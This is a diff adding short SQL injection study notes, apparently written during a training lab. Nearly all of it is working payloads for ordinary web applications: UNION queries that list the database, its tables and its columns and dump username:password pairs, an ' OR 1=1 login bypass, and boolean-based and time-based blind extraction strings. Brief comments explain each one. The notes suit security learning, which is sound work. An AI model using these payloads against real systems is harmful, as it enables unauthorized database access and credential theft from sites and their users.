@@ -1,0 +1,55 @@
+### SQL Inject notes
+## Gather database name
+
+0 UNION SELECT 1,2,database()
+
+## Gather Table Schema
+
+0 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema = '<DATABASE_NAME>'
+  Creating a comma seperated list of table names, getting the information from the "information_schema" 
+
+### Gather Table Information
+
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+
+### Viewing Table Data
+
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+NOTES:
+  group_concat() - 
+
+### Authentication Bypass
+  
+select * from users where username='%username%' and password='%password%' LIMIT 1;
+' OR 1=1;--
+select * from users where username='' and password='' OR 1=1;
+
+### Boolean based
+
+admin123' UNION SELECT 1,2,3 where database() like '%';--
+  # looking for the database name; '%' is a wild card, adding letters, numbers or - and _ one by one can help us find the name of the database. 
+  # We are looking for True statements.
+  
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+  # Now we are looking in the table 'sqli_three' AND where teh table name is, in this case, 'a%'. We can replace 'a' with any character to get a true
+  # value
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+  # Now we are looking for the column names. We can add anohter statement of 'column_name != '<COLUMN_NAME>' to help keep tabs on what we have found, and 
+  # not repeat looking for the same column name
+  
+admin123' UNION SELECT 1,2,3 from users where username like 'a%
+  # With the found column names, we can now start our search for valid usernames
+  
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+  # With a valid username we can now find a valid password that goes along with our beloved user
+  
+### Time based
+
+admin123' UNION select sleep(1), 2 where database() like 'sqli_four%';--
+  # If this is a true statement, then there will be a ONE second pause, we can change the number '1' to a different number, and if true, we will wait X# 
+  # of seconds.
+  
+***Repeat step from Boolean based SQLi, keep a eye out for the time. If you get a pause in your reponse, then your statement is correct
+
